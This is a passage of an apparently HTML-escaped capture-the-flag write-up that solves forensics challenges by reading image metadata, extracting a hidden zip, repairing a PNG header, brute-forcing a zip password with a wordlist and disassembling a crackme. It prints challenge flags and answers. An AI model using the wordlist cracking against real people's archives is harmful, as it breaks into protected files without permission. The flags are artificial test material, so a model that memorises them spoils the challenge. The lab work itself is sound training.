&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/forensics$ exiftool f.03.jpg
ExifTool Version Number         : 10.80
File Name                       : f.03.jpg
Directory                       : .
File Size                       : &lt;span class=&#34;m&#34;&gt;103&lt;/span&gt; kB
File Modification Date/Time     : 2019:10:26 13:57:46-06:00
File Access Date/Time           : 2019:10:26 13:57:46-06:00
File Inode Change Date/Time     : 2020:03:10 18:52:40-06:00
File Permissions                : rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Little-endian &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Intel, II&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
X Resolution                    : &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;
Y Resolution                    : &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;
Resolution Unit                 : inches
Software                        : GIMP 2.10.8
Modify Date                     : 2019:10:20 20:43:54
GPS Latitude                    : &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; deg 0&lt;span class=&#34;s1&#34;&gt;&amp;#39; 0.00&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;GPS Longitude                   : 0 deg 0&amp;#39;&lt;/span&gt; 0.00&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;GPS Altitude                    : 0 m
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Compression                     : JPEG (old-style)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Photometric Interpretation      : YCbCr
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Samples Per Pixel               : 3
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Thumbnail Offset                : 370
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Thumbnail Length                : 10424
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;XMP Toolkit                     : XMP Core 4.4.0-Exiv2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Digital Source Type             : http://cv.iptc.org/newscodes/digitalsourcetype/digitalCapture
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Document ID                     : gimp:docid:gimp:718367af-6e16-4bd5-859e-7d934e66fc4e
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Instance ID                     : xmp.iid:4816adee-26e4-489c-9d9f-125d04d23c3b
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Original Document ID            : xmp.did:8ea562a1-efa5-4766-b216-6fd07e106c76
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Model Release Status            : None
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Api                             : 2.0
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Platform                        : Linux
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Time Stamp                      : 1571600638600225
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Version                         : 2.10.8
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Format                          : image/jpeg
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Creator Tool                    : GIMP 2.10
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Location Created                : 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Location Shown                  : 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Artwork Or Object               : 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Registry ID                     : 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;History Action                  : saved, saved
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;History Changed                 : /metadata, /
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;History Instance ID             : xmp.iid:aad9dc17-4a47-49b9-a57f-540623e0091d, xmp.iid:d8a72d8c-5fd0-43b7-a097-16b682f31893
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;History Software Agent          : Gimp 2.10 (Linux), Gimp 2.10 (Linux)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;History When                    : +01:00, +01:00
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Image Supplier                  : 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Image Creator                   : 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Copyright Owner                 : 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Licensor                        : 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Creator                         : type=&amp;#34;&lt;/span&gt;Seq&lt;span class=&#34;s2&#34;&gt;&amp;#34; FLAG{**********}
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Image Width                     : 800
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Image Height                    : 600
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Encoding Process                : Progressive DCT, Huffman coding
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Bits Per Sample                 : 8
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Color Components                : 3
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Image Size                      : 800x600
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Megapixels                      : 0.480
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Thumbnail Image                 : (Binary data 10424 bytes, use -b option to extract)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;GPS Position                    : 0 deg 0&amp;#39; 0.00&amp;#34;&lt;/span&gt;, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; deg 0&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; 0.00&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sckull@uplifted:~/tmp/forensics&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;f04&#34;&gt;f.04&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/forensics$ file _f.04
_f.04: ASCII text
sckull@uplifted:~/tmp/forensics$ cat _f.04
FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;*******_****_engaged&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
sckull@uplifted:~/tmp/forensics$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;f05png&#34;&gt;f.05.png&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/forensics$ binwalk f.05.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             PNG image, &lt;span class=&#34;m&#34;&gt;1406&lt;/span&gt; x 800, 8-bit/color RGB, non-interlaced
&lt;span class=&#34;m&#34;&gt;99&lt;/span&gt;            0x63            Zlib compressed data, default compression
&lt;span class=&#34;m&#34;&gt;2093725&lt;/span&gt;       0x1FF29D        Zip archive data, at least v2.0 to extract, compressed size: 44, uncompressed size: 400, name: flag.txt
&lt;span class=&#34;m&#34;&gt;2093913&lt;/span&gt;       0x1FF359        End of Zip archive

sckull@uplifted:~/tmp/forensics$ binwalk -e f.05.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             PNG image, &lt;span class=&#34;m&#34;&gt;1406&lt;/span&gt; x 800, 8-bit/color RGB, non-interlaced
&lt;span class=&#34;m&#34;&gt;99&lt;/span&gt;            0x63            Zlib compressed data, default compression
&lt;span class=&#34;m&#34;&gt;2093725&lt;/span&gt;       0x1FF29D        Zip archive data, at least v2.0 to extract, compressed size: 44, uncompressed size: 400, name: flag.txt
&lt;span class=&#34;m&#34;&gt;2093913&lt;/span&gt;       0x1FF359        End of Zip archive

sckull@uplifted:~/tmp/forensics$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; _f.05.png.extracted/
sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ ls
1FF29D.zip  63	63.zlib  flag.txt
sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ cat flag.txt 
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;this_is_another_one_of_them_flags&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;f06png&#34;&gt;f.06.png&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/forensics$ xxd f.06.png &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;head
00000000: &lt;span class=&#34;m&#34;&gt;8950&lt;/span&gt; 4e58 0d0a 1a0a &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; 000d &lt;span class=&#34;m&#34;&gt;4948&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4452&lt;/span&gt;  .PNX........IHDR
00000010: &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0640&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0429&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0806&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0099&lt;/span&gt; 68c1  ...@...&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;......h.
00000020: 1c00 002d c07a &lt;span class=&#34;m&#34;&gt;5458&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7452&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6177&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2070&lt;/span&gt; 726f  ...-.zTXtRaw pro
00000030: &lt;span class=&#34;m&#34;&gt;6669&lt;/span&gt; 6c65 &lt;span class=&#34;m&#34;&gt;2074&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7970&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6520&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6578&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6966&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt;  file &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; exif..
00000040: 78da ad9c &lt;span class=&#34;m&#34;&gt;6992&lt;/span&gt; 2d37 8ea5 ff73 15b9 04ce  x...i.-7...s....
00000050: c372 &lt;span class=&#34;m&#34;&gt;4090&lt;/span&gt; 34eb 1dd4 f2eb 3b1e 21a9 a4ac  .r@.4.....&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;.!...
00000060: 2ab3 6e6b 3d65 46e8 be3b b813 c019 40f0  *.nk&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;eF..&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;....@.
00000070: 86fb 1fff e785 7ffd eb5f 29e6 &lt;span class=&#34;m&#34;&gt;1443&lt;/span&gt; 6d63  ........._&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;..Cmc
00000080: f6d5 7be4 9fba eaca c62f 33fe fcf3 f333  ..&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;....../3....3
00000090: c5fa fdff f70f bff6 df47 fff6 78c8 ebfb  .........G..x...
sckull@uplifted:~/tmp/forensics$
sckull@uplifted:~/tmp/forensics$ xxd -p f.06.png &amp;gt; hex_png06
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;BAD HEADER FILE MAGIC NUMBERS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_file_signatures&#34;&gt;&lt;strong&gt;List of File Signatures&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;m&#34;&gt;89&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt; 4E &lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; 0D 0A 1A 0A
FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;n0_m0r3_c0rrupt10n&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.30.51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;f07zip&#34;&gt;f.07.zip&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/forensics$ fcrackzip -D -u -p /home/sckull/tools/rockyou.txt f.07.zip
PASSWORD FOUND!!!!: &lt;span class=&#34;nv&#34;&gt;pw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; password1
sckull@uplifted:~/tmp/forensics$
sckull@uplifted:~/tmp/forensics$ unzip f.07.zip 
Archive:  f.07.zip
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;f.07.zip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; flag.txt password: 
  inflating: flag.txt                
sckull@uplifted:~/tmp/forensics$ cat flag.txt
FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;zippy_zip_zip_zip&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
sckull@uplifted:~/tmp/forensics$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;f08&#34;&gt;f.08&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/forensics$ file f.08
f.08: ELF 64-bit LSB shared object, x86-64, version &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SYSV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/l, BuildID&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;]=&lt;/span&gt;ea2b43595682667af187b0ac8db31207e9bf845f, &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, not stripped
sckull@uplifted:~/tmp/forensics$ chmod +x f.08
sckull@uplifted:~/tmp/forensics$ ./f.08
Hello, please enter the flag:
hello
Sorry the flag is incorrect

sckull@uplifted:~/tmp/forensics$ gdb -q ./f.08
Reading symbols from ./f.08...&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;...done.
gdb-peda$ disas main
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
   0x00000000000011d4 &amp;lt;+43&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x73&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x46
   0x00000000000011d8 &amp;lt;+47&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x72&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x4c
   0x00000000000011dc &amp;lt;+51&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x71&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x41
   0x00000000000011e0 &amp;lt;+55&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x70&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x47
   0x00000000000011e4 &amp;lt;+59&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x6f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x7b
   0x00000000000011e8 &amp;lt;+63&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x6e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x69
   0x00000000000011ec &amp;lt;+67&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x6d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x6e
   0x00000000000011f0 &amp;lt;+71&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x6c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x63
   0x00000000000011f4 &amp;lt;+75&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x6b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x6f
   0x00000000000011f8 &amp;lt;+79&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x6a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x72
   0x00000000000011fc &amp;lt;+83&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x69&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x72
   0x0000000000001200 &amp;lt;+87&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x68&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x65
   0x0000000000001204 &amp;lt;+91&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x67&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x63
   0x0000000000001208 &amp;lt;+95&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x66&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x74
